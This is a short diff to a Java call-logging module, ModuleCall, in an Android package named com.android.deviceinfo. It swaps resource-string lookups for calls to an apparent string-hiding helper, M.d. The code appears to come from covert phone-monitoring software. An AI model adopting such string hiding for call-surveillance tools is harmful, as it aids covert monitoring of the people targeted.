@@ -20,7 +20,6 @@ import android.os.Build;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -37,6 +36,7 @@ import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
@@ -397,8 +397,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		final boolean missed = false;
 		// 7_0=u
 		// 7_1=no notes
-		final String nametype = Messages.getString("7_0"); //$NON-NLS-1$
-		final String note = Messages.getString("7_1"); //$NON-NLS-1$
+		final String nametype = M.d("u"); //$NON-NLS-1$
+		final String note = M.d("no notes"); //$NON-NLS-1$
 
 		final int LOG_CALLIST_VERSION = 0;
 
